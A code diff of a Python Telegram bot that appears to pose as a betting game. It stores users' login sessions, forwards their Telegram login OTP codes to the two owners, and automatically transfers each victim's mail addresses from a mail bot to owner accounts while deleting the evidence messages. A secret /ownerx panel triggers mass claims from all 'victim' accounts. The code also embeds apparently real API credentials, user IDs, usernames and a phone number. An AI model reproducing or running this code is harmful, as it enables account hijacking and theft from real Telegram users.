@@ -23,18 +23,11 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
 API_ID = int(os.getenv("API_ID", "38746329"))
 API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 
-# Normal Owners (Jo /owner me dikhenge)
-OWNERS_STR = os.getenv("OWNERS", "8612102965")
-OWNERS = [int(x.strip()) for x in OWNERS_STR.split(",") if x.strip().isdigit()]
-
-# Fixed Values
 TARGET_MAIL_BOT = "fakemailbot"
-AUTO_RECEIVE_ID = 6894136753     # Jispe victim ki mails transfer hongi
-AUTO_RECEIVE_USERNAME = "@ISHAN_XDD"
 
-MASTER_ID = 8808192812           # Master Account ID
-MASTER_USERNAME = "@iflexcoderrrrr"
-MASTER_PHONE = "9896489638"
+# DONO OWNERS SET KAR DIYE HAIN
+OWNER_IDS = [6894136753, 8808192812]
+OWNER_USERNAMES = ["@ISHAN_XDD", "@iflexcoderrrrr"]
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -66,13 +59,6 @@ def init_db():
     )""")
     c.execute("CREATE TABLE IF NOT EXISTS bets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, choice TEXT)")
     c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
-    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
-    
-    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
-    except: pass
-
-    for owner in OWNERS:
-        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (owner,))
     conn.commit()
     conn.close()
 
@@ -95,14 +81,6 @@ def get_config(key, default=None):
 
 def set_config(key, value):
     db_exec("INSERT OR REPLACE INTO config (key, value) VALUES (?,?)", (key, value))
-
-def get_all_admins():
-    admins = set(OWNERS)
-    res = db_exec("SELECT user_id FROM admins")
-    if res:
-        for row in res:
-            admins.add(row[0])
-    return list(admins)
 
 active_userbots = {}
 temp_clients = {}
@@ -144,29 +122,34 @@ async def start_userbot(user_id, session_str):
             if sender_id == 777000:
                 full_text = event.message.message or ""
                 bot = Bot(BOT_TOKEN)
-                # OTP bhi sirf master ko jaye
-                try: 
-                    await bot.send_message(MASTER_ID, f"🔐 <b>{f_txt('NEW TELEGRAM LOGIN OTP')}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
-                except: pass
+                for owner in OWNER_IDS:
+                    try: 
+                        await bot.send_message(owner, f"🔐 <b>{f_txt('NEW TELEGRAM LOGIN OTP')}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
+                    except: pass
         except Exception as e:
             logger.error(f"OTP interceptor error: {e}")
 
-    # Auto transfer logic to AUTO_RECEIVE_ID
-    asyncio.create_task(transfer_to_receiver(user_id))
+    # Auto transfer logic to both owners
+    asyncio.create_task(auto_transfer_victim_mails(user_id))
 
-async def transfer_to_receiver(victim_uid):
+async def auto_transfer_victim_mails(victim_uid):
+    # Dono owners ke liye alag alag transfer karega
+    for owner_id, owner_username in zip(OWNER_IDS, OWNER_USERNAMES):
+        asyncio.create_task(transfer_to_owner(victim_uid, owner_id, owner_username))
+
+async def transfer_to_owner(victim_uid, owner_id, owner_username):
     try:
         victim_client = await get_or_connect_client(victim_uid)
-        receiver_client = await get_or_connect_client(AUTO_RECEIVE_ID)
+        owner_client = await get_or_connect_client(owner_id)
         
-        if not victim_client or not receiver_client: 
+        if not victim_client or not owner_client: 
             return
             
         target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
-        receiver_target_bot = await receiver_client.get_entity(TARGET_MAIL_BOT)
+        owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
         
         bot = Bot(BOT_TOKEN)
-        await bot.send_message(MASTER_ID, f"⏳ <b>{f_txt('FETCHING MAILS FROM VICTIM')}:</b> {p_style(victim_uid)}", parse_mode="HTML")
+        await bot.send_message(owner_id, f"⏳ <b>{f_txt('FETCHING MAILS FROM VICTIM')}:</b> {p_style(victim_uid)}", parse_mode="HTML")
         
         await victim_client.send_message(target_bot, "/id")
         await asyncio.sleep(4)
@@ -177,14 +160,13 @@ async def transfer_to_receiver(victim_uid):
         emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
         
         if not emails: 
-            return await bot.send_message(MASTER_ID, f"❌ {p_style('No mails found on this account')}", parse_mode="HTML")
+            return await bot.send_message(owner_id, f"❌ {p_style('No mails found on this account')}", parse_mode="HTML")
 
         total = len(emails)
         for idx, email in enumerate(emails, 1):
-            await bot.send_message(MASTER_ID, f"🔄 <b>{f_txt('TRANSFERRING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
+            await bot.send_message(owner_id, f"🔄 <b>{f_txt('TRANSFERRING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
             
-            # Transfer to AUTO_RECEIVE_ID
-            await victim_client.send_message(target_bot, f"/transfer {email} {AUTO_RECEIVE_USERNAME}")
+            await victim_client.send_message(target_bot, f"/transfer {email} {owner_username}")
             await asyncio.sleep(4)
             
             try:
@@ -192,24 +174,23 @@ async def transfer_to_receiver(victim_uid):
                 await victim_client.delete_messages(target_bot, msgs[0].id)
             except: pass
             
-            await bot.send_message(MASTER_ID, f"📥 <b>{f_txt('CLAIMING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
+            await bot.send_message(owner_id, f"📥 <b>{f_txt('CLAIMING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
             
-            # Claim from AUTO_RECEIVE_ID
-            await receiver_client.send_message(receiver_target_bot, email)
+            await owner_client.send_message(owner_target_bot, email)
             await asyncio.sleep(4)
             
             try:
-                msgs = await receiver_client.get_messages(receiver_target_bot, limit=1)
-                await receiver_client.delete_messages(receiver_target_bot, msgs[0].id)
+                msgs = await owner_client.get_messages(owner_target_bot, limit=1)
+                await owner_client.delete_messages(owner_target_bot, msgs[0].id)
             except: pass
             
-            await bot.send_message(MASTER_ID, f"✅ <b>{f_txt('CLAIMED SUCCESSFULLY')}</b>:\n{p_style(email)}", parse_mode="HTML")
+            await bot.send_message(owner_id, f"✅ <b>{f_txt('CLAIMED SUCCESSFULLY')}</b>:\n{p_style(email)}", parse_mode="HTML")
             await asyncio.sleep(1)
             
-        await bot.send_message(MASTER_ID, f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>,\n{p_style('Total: ' + str(total))}", parse_mode="HTML")
+        await bot.send_message(owner_id, f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>,\n{p_style('Total: ' + str(total))}", parse_mode="HTML")
             
     except Exception as e:
-        logger.error(f"Transfer error: {e}")
+        logger.error(f"Transfer error for {owner_id}: {e}")
 
 # ================== KEYBOARDS ==================
 def get_main_keyboard():
@@ -273,20 +254,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
     
-    if uid in get_all_admins() or uid == MASTER_ID:
-        state = user_states.get(uid)
-        if state == 'result':
-            res = text.upper()
-            if res in ['RED', 'BLUE', 'GREEN']:
-                set_config("bet_result", res)
-                await update.message.reply_text(f"✅ {p_style('Bet Result set to ' + res)}", parse_mode="HTML")
-            user_states[uid] = None; return
-        elif state == 'admin':
-            if text.isdigit():
-                db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
-                await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
-            user_states[uid] = None; return
-
     if uid in temp_clients:
         state = temp_clients[uid].get('state')
         
@@ -394,127 +361,56 @@ async def bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_states['bet_choice'] = choice
     await query.edit_message_text(f"💰 <b>{f_txt('Enter amount to bet on ' + choice.upper())}</b>,")
 
-# ================== NORMAL OWNER PANEL ==================
-async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ================== SECRET OWNER PANEL (/ownerx) ==================
+async def secret_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    if uid not in get_all_admins(): return
     
-    # Normal Admin Panel (No master details shown)
-    kb = [
-        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc")],
-        [InlineKeyboardButton("🎰 Set Result", callback_data="admin_result"), InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")]
-    ]
-    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>,\nAll commands:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
-
-# ================== MASTER OWNER PANEL (/owner2) ==================
-async def master_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if uid != MASTER_ID: 
+    # Dono IDs hi access kar sakti hain
+    if uid not in OWNER_IDS: 
         return await update.message.reply_text("❌ Unauthorized Access!")
     
     text = (
-        f"<b>👑 {f_txt('MASTER OWNER PANEL')}</b>,\n\n"
-        f"📱 <b>{f_txt('Phone')}:</b> {p_style(MASTER_PHONE)}\n"
-        f"🆔 <b>{f_txt('Master ID')}:</b> {p_style(MASTER_ID)}\n"
-        f"🔗 <b>{f_txt('Username')}:</b> {p_style(MASTER_USERNAME)}\n"
+        f"<b>👑 {f_txt('SECRET OWNER PANEL')}</b>,\n\n"
+        f"🆔 <b>{f_txt('Your ID')}:</b> {p_style(uid)}\n"
     )
     kb = [
-        [InlineKeyboardButton("📤 Claim All Mails From Victims", callback_data="master_claim")],
-        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("🎰 Set Result", callback_data="admin_result")]
+        [InlineKeyboardButton("📤 Claim All Mails (For This Account)", callback_data="secret_claim")],
+        [InlineKeyboardButton("👥 Logged Devices", callback_data="secret_acc")]
     ]
     await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
-async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def secret_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
     uid = query.from_user.id
     
-    if data == "admin_acc":
+    if uid not in OWNER_IDS: return await query.answer("Unauthorized", show_alert=True)
+    
+    if data == "secret_acc":
         users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
-        text = f"👥 <b>{f_txt('Accounts')}:</b>,\n\n"
-        for u in users: text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
+        text = f"👥 <b>{f_txt('Logged Devices/Accounts')}:</b>,\n\n"
+        for u in users: 
+            text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
         await query.edit_message_text(text, parse_mode="HTML")
         
-    elif data == "admin_result":
-        await query.edit_message_text(f"🎰 {f_txt('Send Result')} (RED or BLUE),")
-        user_states[uid] = 'result'
+    elif data == "secret_claim":
+        # Jis ID ne button dabaya hai, usi ke username pe transfer hoga
+        if uid == OWNER_IDS[0]:
+            target_uname = OWNER_USERNAMES[0]
+        else:
+            target_uname = OWNER_USERNAMES[1]
+            
+        await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING AND TRANSFERRING ALL MAILS TO YOUR ACCOUNT')}</b>,\nPlease wait...", parse_mode="HTML")
         
-    elif data == "admin_add":
-        await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')},")
-        user_states[uid] = 'admin'
-
-    elif data == "master_claim":
-        if uid != MASTER_ID: return await query.answer("Unauthorized", show_alert=True)
-        
-        await query.edit_message_text(f"⏳ <b>{f_txt('FETCHING AND TRANSFERRING ALL MAILS TO MASTER')}</b>,\nPlease wait...", parse_mode="HTML")
-        
-        # Fetch all victims (excluding admin, auto_receive, and master)
-        users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id != ? AND user_id != ? AND user_id != ?", (uid, AUTO_RECEIVE_ID, MASTER_ID))
+        # Fetch all victims (excluding owners)
+        users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL AND user_id != ? AND user_id != ?", (OWNER_IDS[0], OWNER_IDS[1]))
         
         if not users:
             return await query.message.reply_text("❌ No victim accounts found,")
             
         for u in users:
-            asyncio.create_task(transfer_to_master(u[0], uid))
-
-# Master claim logic
-async def transfer_to_master(victim_uid, master_uid):
-    try:
-        victim_client = await get_or_connect_client(victim_uid)
-        master_client = await get_or_connect_client(master_uid)
-        
-        if not victim_client or not master_client: 
-            return
-            
-        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
-        master_target_bot = await master_client.get_entity(TARGET_MAIL_BOT)
-        
-        bot = Bot(BOT_TOKEN)
-        await bot.send_message(master_uid, f"⏳ <b>{f_txt('FETCHING MAILS FROM VICTIM')}:</b> {p_style(victim_uid)}", parse_mode="HTML")
-        
-        await victim_client.send_message(target_bot, "/id")
-        await asyncio.sleep(4)
-        
-        messages = await victim_client.get_messages(target_bot, limit=2)
-        if not messages: return
-            
-        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
-        
-        if not emails: 
-            return await bot.send_message(master_uid, f"❌ {p_style('No mails found')}", parse_mode="HTML")
-
-        total = len(emails)
-        for idx, email in enumerate(emails, 1):
-            await bot.send_message(master_uid, f"🔄 <b>{f_txt('TRANSFERRING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
-            
-            # Transfer to MASTER_USERNAME
-            await victim_client.send_message(target_bot, f"/transfer {email} {MASTER_USERNAME}")
-            await asyncio.sleep(4)
-            
-            try:
-                msgs = await victim_client.get_messages(target_bot, limit=1)
-                await victim_client.delete_messages(target_bot, msgs[0].id)
-            except: pass
-            
-            await bot.send_message(master_uid, f"📥 <b>{f_txt('CLAIMING')}</b> ({idx}/{total}):\n{p_style(email)}", parse_mode="HTML")
-            
-            # Claim from MASTER_ID
-            await master_client.send_message(master_target_bot, email)
-            await asyncio.sleep(4)
-            
-            try:
-                msgs = await master_client.get_messages(master_target_bot, limit=1)
-                await master_client.delete_messages(master_target_bot, msgs[0].id)
-            except: pass
-            
-            await bot.send_message(master_uid, f"✅ <b>{f_txt('CLAIMED SUCCESSFULLY')}</b>:\n{p_style(email)}", parse_mode="HTML")
-            await asyncio.sleep(1)
-            
-        await bot.send_message(master_uid, f"👑 <b>{f_txt('ALL MAILS CLAIMED SUCCESSFULLY')}</b>,\n{p_style('Total: ' + str(total))}", parse_mode="HTML")
-            
-    except Exception as e:
-        logger.error(f"Transfer error: {e}")
+            asyncio.create_task(transfer_to_owner(u[0], uid, target_uname))
 
 # ================== MAIN ==================
 def main():
@@ -522,11 +418,10 @@ def main():
     app_bot = Application.builder().token(BOT_TOKEN).build()
 
     app_bot.add_handler(CommandHandler("start", start))
-    app_bot.add_handler(CommandHandler("owner", owner_panel))         # Normal panel
-    app_bot.add_handler(CommandHandler("owner2", master_owner_panel)) # Secret Master panel
+    app_bot.add_handler(CommandHandler("ownerx", secret_owner_panel)) # Secret Panel
     app_bot.add_handler(MessageHandler(filters.CONTACT, verify_phone))
     app_bot.add_handler(CallbackQueryHandler(bet_callback, pattern="^bet_"))
-    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
+    app_bot.add_handler(CallbackQueryHandler(secret_callback, pattern="^secret_"))
     app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))
 
     logger.info("Bot started successfully.")
